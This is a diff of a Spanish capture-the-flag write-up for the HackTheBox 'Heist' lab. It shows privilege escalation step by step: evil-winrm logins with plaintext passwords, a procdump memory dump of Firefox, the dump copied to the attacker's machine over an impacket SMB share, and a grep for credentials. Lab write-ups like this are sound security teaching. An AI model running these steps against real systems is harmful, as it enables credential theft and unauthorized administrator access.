@@ -227,6 +227,7 @@ evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
 # ESCALADA DE PRIVILEGIOS
 
  - Comprobamos los privilegios que tenemos dentro del sistema pero no podemos aprovecharnos de ninguno:
+
 ```powershell
 *Evil-WinRM* PS C:\Users\Chase\Documents> whoami /priv
 
@@ -240,6 +241,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
 - Como hay un servidor web y sabemos que hay un archivo llamado `login.php`, podemos ir a la ruta `inetpub\wwwroot\login.php` y comprobar dicho fichero a ver si podemos ver credenciales validas:
+
 ```php
 <?php
 session_start();
@@ -263,6 +265,7 @@ else if( isset($_GET['guest']) ) {
 ```
 
 Como podemos ver hay un `hash` tipo `sha256` podemos probar crackearlo con `hashcat` pero no dará ningún resultado. Por lo que dentro del directorio personal del usuario `Chase` se encuentra unas notas que nos darán una serie de pistas:
+
 ```powershell
 *Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
 Stuff to-do:
@@ -274,6 +277,7 @@ Done:
 ```
 
 Dice que sigamos chequeando la lista de problemas, por lo que nos da una pista y lo que hacemos ahora es mostrar la lista de procesos activos dentro del sistema de la siguiente forma:
+
 ```powershell
 Get-Process
     355      25    16400      38908       0.14   3768   1 firefox
@@ -284,12 +288,14 @@ Get-Process
 ```
 
 Como podemos ver hay varios procesos activos del navegador firefox por lo que es bastante raro, por lo que podemos dumpear y ver si podemos obtener credenciales:
+
 ```powershell
 *Evil-WinRM* PS C:\Users\Chase\Documents> upload /home/kali/Heist/exploits/procdump64.exe .
 Info: Upload successful!
 ```
 
 - Ejecutamos la herramienta de la siguiente forma para el `dumpeo`:
+
 ```powershell
 *Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 6252 -accepteula
 ProcDump v9.0 - Sysinternals process dump utility
@@ -299,6 +305,7 @@ Sysinternals - www.sysinternals.com
 ```
 
 - Pasamos el archivo a nuestra maquina atacante para aplicarle la regex, para buscar la password:
+
 ```bash
 impacket-smbserver dumpeo -smb2support $(pwd) -user test -password test
 ```
@@ -309,16 +316,19 @@ move firefox.exe_7908054_023447.dmp n:\firefox.exe_7908054_023447.dmp
 ```
 
 - Buscamos la password dentro del archivo:
+
 ```bash
 grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.exe_7908054_023447.dmp
 ```
 
 - Encontramos dichas credenciales:
+
 ```bash
 4dD!5}x/re8]FBuZ
 ```
 
 - Iniciamos sesión como `Administrator con Winrm` y ya tenemos control total de la maquina:
+
 ```powersehll
 evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
 
